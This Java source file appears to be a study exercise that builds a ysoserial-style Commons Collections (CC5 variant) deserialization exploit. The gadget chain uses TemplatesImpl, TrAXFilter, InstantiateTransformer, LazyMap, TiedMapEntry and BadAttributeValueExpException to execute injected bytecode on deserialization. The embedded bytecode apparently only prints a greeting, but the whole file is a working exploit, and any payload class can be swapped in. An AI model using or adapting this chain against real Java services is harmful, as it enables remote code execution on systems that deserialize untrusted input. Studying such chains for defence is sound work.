package com.sec.cwm.base.ysoserial;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC5 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String bytecode(String filename) throws Exception {
        File file=new File(filename);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int a=0;
        while ((a = fis.read(bytes)) != -1) {
            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
            // 下标0开始截取，a表示输入流read到的字节数。
            out.write(bytes, 0, a);
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(bytes);
        return encodedText;
    }
     public static void main(String args[]) throws Exception {
         String bytecode=bytecode("C:\\Users\\CWM\\IdeaProjects\\test\\src\\main\\java\\com\\sec\\cwm\\base\\HelloTempImpl.class");
         byte[] code = Base64.getDecoder().decode(bytecode);
//        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=");
         TemplatesImpl obj = new TemplatesImpl();
         setFieldValue(obj, "_bytecodes", new byte[][] {code});
         setFieldValue(obj, "_name", "HelloTempImpl");
         setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

//        obj.newTransformer();
//        Transformer[] TransformMap=new Transformer[]{
//                new ConstantTransformer(obj),
//                new InvokerTransformer("newTransformer",null,null)
//        };
         Transformer[] TransformMap=new Transformer[]{
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj})
         };
         ChainedTransformer chains=new ChainedTransformer(TransformMap);
         Map innermap= LazyMap.decorate(new HashMap(),chains);
         TiedMapEntry tiedMapEntry=new TiedMapEntry(innermap,"cwm");
         BadAttributeValueExpException badAttributeValueExpException=new BadAttributeValueExpException("yuanshen");
         Field f=BadAttributeValueExpException.class.getDeclaredField("val");
         f.setAccessible(true);
         f.set(badAttributeValueExpException,tiedMapEntry);
         ByteArrayOutputStream baos=new ByteArrayOutputStream();
         ObjectOutputStream oos=new ObjectOutputStream(baos);
         oos.writeObject(badAttributeValueExpException);
         oos.close();
         ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
         ois.readObject();
     }
}
